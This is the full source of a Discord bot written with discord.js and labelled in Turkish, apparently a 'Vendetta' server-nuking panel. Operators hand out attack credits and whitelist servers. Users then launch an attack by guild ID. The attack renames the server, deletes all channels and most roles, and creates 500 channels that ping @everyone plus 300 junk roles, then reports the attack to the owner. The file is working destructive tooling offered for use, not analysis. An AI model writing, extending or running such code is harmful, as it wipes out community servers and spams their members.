require('dotenv').config();
const { 
  Client, GatewayIntentBits, Partials,
  EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
  ModalBuilder, TextInputBuilder, TextInputStyle, Events, StringSelectMenuBuilder, StringSelectMenuOptionBuilder
} = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

// ---------------- CONFIG ----------------
const OWNER_ID = process.env.OWNER_ID;
const SERIYIZ_ID = process.env.SERIYIZ_ID;
const HAK_CHANNEL_ID = process.env.HAK_CHANNEL_ID;
const WL_CHANNEL_ID = process.env.WL_CHANNEL_ID;
const BOT_TOKEN = process.env.TOKEN;

// ---------------- DATABASE ----------------
const haklar = {};      
const whitelist = {};   

let hakMessageCache;
let wlMessageCache;

// ---------------- READY ----------------
client.once('ready', async () => {
  console.log(`${client.user.tag} aktif!`);

  const hakChannel = await client.channels.fetch(HAK_CHANNEL_ID).catch(()=>null);
  if (hakChannel) {
    const messages = await hakChannel.messages.fetch({ limit: 10 }).catch(()=>null);
    if (messages && messages.size > 0) hakMessageCache = messages.first();
    else hakMessageCache = await hakChannel.send("**HAKLAR**\nKimse yok").catch(()=>null);
  }

  const wlChannel = await client.channels.fetch(WL_CHANNEL_ID).catch(()=>null);
  if (wlChannel) {
    const messages = await wlChannel.messages.fetch({ limit: 10 }).catch(()=>null);
    if (messages && messages.size > 0) wlMessageCache = messages.first();
    else wlMessageCache = await wlChannel.send("**WHITELIST**\nHiçbir sunucu yok").catch(()=>null);
  }
});

// =============================================================
// PANEL KOMUTU
// =============================================================
client.on(Events.MessageCreate, async msg => {
  if (msg.content !== ".panel") return;

  const isim = msg.author.id === SERIYIZ_ID ? "Doğukan" :
               msg.author.id === OWNER_ID ? "Emir" :
               msg.author.username;

  const embed = new EmbedBuilder()
    .setColor("Grey")
    .setTitle(`Vendetta N@ke Paneline Hoşgeldin ${isim}`)
    .setDescription("P@nelde Neler Yapabilirsin?");

  const menu = new StringSelectMenuBuilder()
    .setCustomId("panel_menu")
    .setPlaceholder("Sistem Seç")
    .addOptions(
      new StringSelectMenuOptionBuilder().setLabel("Hak Sistemi").setValue("hak"),
      new StringSelectMenuOptionBuilder().setLabel("Whitelist Sistemi").setValue("wl")
    );

  const row = new ActionRowBuilder().addComponents(menu);

  msg.reply({ embeds: [embed], components: [row] });
});

// =============================================================
// PANEL MENÜ İŞLEM
// =============================================================
client.on(Events.InteractionCreate, async inter => {
  if (!inter.isStringSelectMenu()) return;
  if (inter.customId !== "panel_menu") return;

  const isim = inter.user.id === OWNER_ID ? "Emir" :
               inter.user.id === SERIYIZ_ID ? "Doğukan" :
               inter.user.username;

  if (inter.values[0] === "hak") {
    const embed = new EmbedBuilder()
      .setColor("Grey")
      .setTitle(isim)
      .setDescription("Hak Kontrol Sistemine Aktarıldınız!");

    const altText = ">>> Burada Neler Yapabilirsin?\nAşağıdaki butonları kullanabilirsiniz.";

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId("hak_ekle").setLabel("Hak Ekle").setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId("hak_cikar").setLabel("Hak Çıkar").setStyle(ButtonStyle.Danger),
      new ButtonBuilder().setCustomId("hak_liste").setLabel("Hak Listesi").setStyle(ButtonStyle.Secondary)
    );

    return inter.update({ embeds: [embed], components: [row], content: altText });
  }

  if (inter.values[0] === "wl") {
    const embed = new EmbedBuilder()
      .setColor("Grey")
      .setTitle(isim)
      .setDescription("Whitelist Sistemine Aktarıldınız!");

    const altText = ">>> Burada Neler Yapabilirsin?\nAşağıdaki butonları kullanabilirsiniz.";

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId("wl_ekle").setLabel("Wl Ekle").setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId("wl_cikar").setLabel("Wl Çıkar").setStyle(ButtonStyle.Danger),
      new ButtonBuilder().setCustomId("wl_liste").setLabel("Whitelist").setStyle(ButtonStyle.Secondary)
    );

    return inter.update({ embeds: [embed], components: [row], content: altText });
  }
});

// =============================================================
// HAK & WL BUTON → MODAL
// =============================================================
client.on(Events.InteractionCreate, async inter => {
  if (!inter.isButton()) return;

  const modalMaker = (id, title) => {
    const m = new ModalBuilder().setCustomId(id).setTitle(title);
    m.addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId("uid").setLabel("ID").setRequired(true).setStyle(TextInputStyle.Short)
      ),
      new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId("value").setLabel("Sayı / Veri").setRequired(false).setStyle(TextInputStyle.Short)
      )
    );
    return m;
  };

  const modals = {
    hak_ekle: modalMaker("m_hak_ekle", "Hak Ekle"),
    hak_cikar: modalMaker("m_hak_cikar", "Hak Çıkar"),
    wl_ekle: modalMaker("m_wl_ekle", "Whitelist Ekle"),
    wl_cikar: modalMaker("m_wl_cikar", "Whitelist Çıkar")
  };

  if (modals[inter.customId]) return inter.showModal(modals[inter.customId]);

  if (inter.customId === "hak_liste") {
    let msg = Object.entries(haklar)
      .map(([id, h]) => `<@${id}>: ${h} hak`)
      .join("\n") || "Hak bulunmuyor";
    return inter.reply({ content: msg, ephemeral: true });
  }

  if (inter.customId === "wl_liste") {
    let msg = Object.entries(whitelist)
      .map(([id, d]) => `${d.name} - ${d.owner} - ${id}`)
      .join("\n") || "Whitelist boş";
    return inter.reply({ content: msg, ephemeral: true });
  }
});

// =============================================================
// HAK & WL → MODAL SUBMIT
// =============================================================
client.on(Events.InteractionCreate, async inter => {
  if (!inter.isModalSubmit()) return;

  const id = inter.fields.getTextInputValue("uid");
  const val = inter.fields.getTextInputValue("value");

  if (inter.customId === "m_hak_ekle") {
    if (!haklar[id]) haklar[id] = 0;
    haklar[id] += Number(val);

    if (hakMessageCache) {
      let text = "**HAKLAR**\n" + Object.entries(haklar).map(([uid,h]) => `<@${uid}> \`${h}\``).join("\n");
      hakMessageCache.edit(text).catch(()=>{});
    }

    return inter.reply({ content: "Hak eklendi!", ephemeral: true });
  }

  if (inter.customId === "m_hak_cikar") {
    if (!haklar[id]) haklar[id] = 0;
    haklar[id] = Math.max(0, haklar[id] - Number(val));

    if (hakMessageCache) {
      let text = "**HAKLAR**\n" + Object.entries(haklar).map(([uid,h]) => `<@${uid}> \`${h}\``).join("\n");
      hakMessageCache.edit(text).catch(()=>{});
    }

    return inter.reply({ content: "Hak çıkarıldı!", ephemeral: true });
  }

  if (inter.customId === "m_wl_ekle") {
    whitelist[id] = { name: "Sunucu", owner: "Bilinmiyor" };

    if (wlMessageCache) {
      let text = "**WHITELIST**\n" + Object.entries(whitelist).map(([id,d]) => `${d.name} - ${d.owner} - ${id}`).join("\n");
      wlMessageCache.edit(text).catch(()=>{});
    }

    return inter.reply({ content: "Whitelist eklendi!", ephemeral: true });
  }

  if (inter.customId === "m_wl_cikar") {
    delete whitelist[id];

    if (wlMessageCache) {
      let text = "**WHITELIST**\n" + Object.entries(whitelist).map(([id,d]) => `${d.name} - ${d.owner} - ${id}`).join("\n") || "Hiçbir sunucu yok";
      wlMessageCache.edit(text).catch(()=>{});
    }

    return inter.reply({ content: "Whitelistten çıkarıldı!", ephemeral: true });
  }
});

// =============================================================
// .vndt → DM PANELİ
// =============================================================
client.on(Events.MessageCreate, async msg => {
  if (msg.content !== ".vndt") return;

  const hak = haklar[msg.author.id] || 0;
  if (hak <= 0) return msg.author.send("Hakkın yok!").catch(()=>{});

  const embed = new EmbedBuilder()
    .setColor("Red")
    .setTitle("Vendetta Hakkınız")
    .setDescription(`• Mevcut hak: \`${hak}\`\n• Saldırı başlatmak için butona bas.`);

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId("vnd_start")
      .setLabel("💣 Vendetta Başlat")
      .setStyle(ButtonStyle.Danger)
  );

  return msg.author.send({ embeds: [embed], components: [row] });
});

// =============================================================
// Vendetta Başlat (Modal)
client.on(Events.InteractionCreate, async inter => {
  if (!inter.isButton()) return;
  if (inter.customId !== "vnd_start") return;

  const hak = haklar[inter.user.id] || 0;
  if (hak <= 0) return inter.reply({ content: "Hakkın yok!", ephemeral: true });

  const modal = new ModalBuilder()
    .setCustomId("vnd_modal")
    .setTitle("Vendetta Modu")
    .addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId("guild").setLabel("Sunucu ID").setRequired(true).setStyle(TextInputStyle.Short)
      )
    );

  inter.showModal(modal);
});

// =============================================================
// Vendetta Saldırı
client.on(Events.InteractionCreate, async inter => {
  if (!inter.isModalSubmit()) return;
  if (inter.customId !== "vnd_modal") return;

  const gid = inter.fields.getTextInputValue("guild");
  const guild = client.guilds.cache.get(gid);
  if (!guild) return inter.reply({ content: "Sunucu bulunamadı.", ephemeral: true });

  if (whitelist[gid]) return inter.reply({ content: "Sunucu whitelistte!", ephemeral: true });

  haklar[inter.user.id] -= 1;
  inter.reply({ content: "Vendetta başlatılıyor…", ephemeral: true });

  const figürler = ["ᵛᵃⁿᵈᵉᵗᵗᵃ","ف͜͡س͜͡د͜͡ر͜͡ت͜͡ا","ⴼⵉⵣⵣⴰⵔ","ᎶᏫᎾᎠᏴᎽᎬ","سـتـغـرق"];
  const rastgele = () => figürler[Math.floor(Math.random()*figürler.length)];

  guild.setName(`Vᴇɴᴅᴇᴛᴛᴀ ${rastgele()}`).catch(()=>{});

  // Kanalları ve rolleri sil
  guild.channels.cache.forEach(ch => ch.delete().catch(()=>{}));
  guild.roles.cache.forEach(r => { if(r.id!==guild.id) r.delete().catch(()=>{}); });

  // 500 kanal oluştur
  for(let i=0;i<500;i++){
    guild.channels.create({ name: `${rastgele()}-${i}`, type: 0 }).then(ch => ch.send("@everyone Vᴇɴᴅᴇᴛᴛᴀ").catch(()=>{})).catch(()=>{});
  }

  // 300 rol oluştur
  for(let i=0;i<300;i++){
    guild.roles.create({ name: rastgele(), permissions: [] }).catch(()=>{});
  }

  // Owner log
  const owner = await client.users.fetch(OWNER_ID).catch(()=>{});
  if(owner){
    const embed = new EmbedBuilder()
      .setColor("Red")
      .setTitle("🔥 VENDETTA BAŞLATILDI")
      .addFields(
        { name: "Yapan", value: `${inter.user.tag} (${inter.user.id})` },
        { name: "Sunucu", value: `${guild.name} (${guild.id})` }
      );
    owner.send({ embeds: [embed] }).catch(()=>{});
  }
});

client.login(BOT_TOKEN);
